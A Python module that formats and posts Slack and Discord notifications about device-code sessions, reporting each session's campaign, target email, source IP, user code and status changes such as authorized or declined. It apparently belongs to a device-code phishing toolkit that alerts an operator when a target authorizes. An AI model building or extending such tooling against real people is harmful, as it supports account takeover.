"""Slack/Discord notifications for session events, driven by NotificationConfig."""
from typing import Optional

import requests
from app.models import NotificationConfig, DeviceCodeSession


def _build_message(session: DeviceCodeSession, event: str, old_status: Optional[str] = None) -> str:
    """Create a readable, emoji-friendly message for Slack/Discord."""
    campaign = session.campaign
    target = session.target_email or "unknown target"
    ip = session.source_ip or "unknown IP"

    if event == "session_created":
        title = "🆕 New device-code session created"
    elif event == "status_authorized":
        title = "✅ Session authorized"
    elif event == "status_expired":
        title = "⏰ Session expired"
    elif event == "status_declined":
        title = "🙅 Session declined by user"
    elif event == "status_error":
        title = "⚠️ Session error"
    elif event == "status_cancelled":
        title = "🛑 Session cancelled"
    else:
        title = f"🔔 Session update ({event})"

    lines = [
        title,
        f"📣 Campaign: *{campaign.name or 'Unnamed'}*",
        f"👤 Target: `{target}`",
        f"🆔 Session ID: `{session.id}`",
        f"🌐 IP: `{ip}`",
    ]

    if old_status is not None:
        lines.append(f"📊 Status: `{old_status}` → `{session.status}`")
    else:
        lines.append(f"📊 Status: `{session.status}`")

    if session.user_code:
        lines.append(f"🔑 User code: `{session.user_code}`")

    return "\n".join(lines)


def send_session_notification(session: DeviceCodeSession, event: str, old_status: Optional[str] = None) -> None:
    """Send a notification about a session event, if enabled in NotificationConfig."""
    try:
        cfg = NotificationConfig.query.first()
        if not cfg:
            return

        # Per-event toggles.
        if event == "session_created" and not cfg.notify_on_session_created:
            return
        if event == "status_authorized" and not cfg.notify_on_status_authorized:
            return
        if event == "status_expired" and not cfg.notify_on_status_expired:
            return
        if event == "status_declined" and not cfg.notify_on_status_declined:
            return
        if event == "status_error" and not cfg.notify_on_status_error:
            return
        if event == "status_cancelled" and not cfg.notify_on_status_cancelled:
            return

        message = _build_message(session, event, old_status)

        # Slack
        if cfg.slack_enabled and cfg.slack_bot_token and cfg.slack_channel:
            try:
                headers = {"Authorization": f"Bearer {cfg.slack_bot_token}"}
                payload = {"channel": cfg.slack_channel, "text": message}
                requests.post("https://slack.com/api/chat.postMessage", headers=headers, json=payload, timeout=10)
            except Exception:
                # Notifications must never break core flow.
                pass

        # Discord
        if cfg.discord_enabled and cfg.discord_bot_token and cfg.discord_channel_id:
            try:
                url = f"https://discord.com/api/v10/channels/{cfg.discord_channel_id}/messages"
                headers = {"Authorization": f"Bot {cfg.discord_bot_token}", "Content-Type": "application/json"}
                payload = {"content": message}
                requests.post(url, headers=headers, json=payload, timeout=10)
            except Exception:
                pass
    except Exception:
        # Hard failure should be ignored; core app must keep running.
        return

